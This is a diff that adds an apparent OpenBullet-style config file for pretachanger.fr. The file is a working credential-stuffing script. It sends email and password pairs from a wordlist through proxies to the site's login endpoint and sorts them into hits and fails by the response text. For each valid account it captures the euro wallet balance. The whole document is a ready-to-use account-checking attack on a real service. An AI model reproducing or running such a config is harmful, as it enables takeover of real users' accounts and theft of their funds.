@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "pretachanger.fr",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T22:00:22.4019416+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.pretachanger.fr/authenticate.php" 
+  CONTENT "email=<USER>&password=<PASS>&referer=https%3A%2F%2Fwww.pretachanger.fr%2F&submit=Se+Connecter" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.pretachanger.fr" 
+  HEADER "referer: https://www.pretachanger.fr/signupbox.php" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "authority: www.pretachanger.fr" 
+  HEADER "method: POST" 
+  HEADER "path: /authenticate.php" 
+  HEADER "scheme: https" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Porte-monnaie :" 
+  KEYCHAIN Failure OR 
+    KEY "Désolé, vos identifiants ne sont pas reconnus.</" 
+PARSE "<SOURCE>" LR "myWallet\"><i class=\"fa fa-euro\"></i>Porte-monnaie : " "  € </a></li>" -> CAP "Balance" "" "€" 
